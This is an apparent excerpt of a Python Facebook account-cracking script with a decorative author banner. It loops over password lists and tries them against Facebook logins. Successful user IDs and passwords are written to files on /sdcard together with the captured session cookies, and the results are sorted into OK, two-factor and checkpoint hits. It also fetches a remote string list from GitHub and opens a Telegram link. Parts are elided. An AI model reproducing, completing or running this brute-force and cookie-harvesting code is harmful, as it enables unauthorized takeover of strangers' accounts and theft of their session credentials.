...
os.system('xdg-open https://t.me/anishxettri21')
...
usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
Y8888P' Y888888P Y88888P YP   YP Y88888P  {BLUE}XD {WHITE}                                                                                                                                                                             
   \33[37;41m\t[ᥫ᭡] DEVELOPED BY BILAL AHMED (BILLU)\33[0;m
{GREEN}[ᥫ᭡] AUTHOR     : BILAL AHMED
{GREEN}[ᥫ᭡] FACEBOOK   : BILAL輪
{GREEN}[ᥫ᭡] GITHUB     : BILAL787750

{WHITE}================================================
   \33[37;41m\t ONE AND ONLY GOD IS ALLAH\33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
def clear():
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [GOD-ANISH-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/GOD-ANISH-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANISH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ANISH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [GOD-ANISH-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [GOD-ANISH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ANISH-COOKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANISH-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [ANISH-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANISH-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
